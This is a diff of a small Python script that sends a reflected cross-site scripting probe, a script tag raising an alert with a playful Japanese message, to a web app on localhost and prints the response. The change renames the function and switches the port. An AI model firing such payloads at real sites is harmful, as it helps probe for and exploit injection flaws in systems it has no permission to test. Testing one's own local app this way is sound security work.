@@ -1,11 +1,11 @@
 import requests
 
-def xss_attack(target_url):
-    payload = "<script>alert('999号参上♡');</script>"
-    url = f"{target_url}?name={payload}"
-    print(f"🚨 攻撃中：{url}")
-    res = requests.get(url)
-    print(res.text)
+def send_xss_attack():
+    target_url = "http://localhost:5000"
+    payload = '<script>alert("９９９号しゅつげん♡");</script>'
+    response = requests.get(target_url, params={"name": payload})
+    print("🎯 攻撃レスポンス：")
+    print(response.text)
 
 if __name__ == "__main__":
-    xss_attack("http://localhost:8080")
+    send_xss_attack()
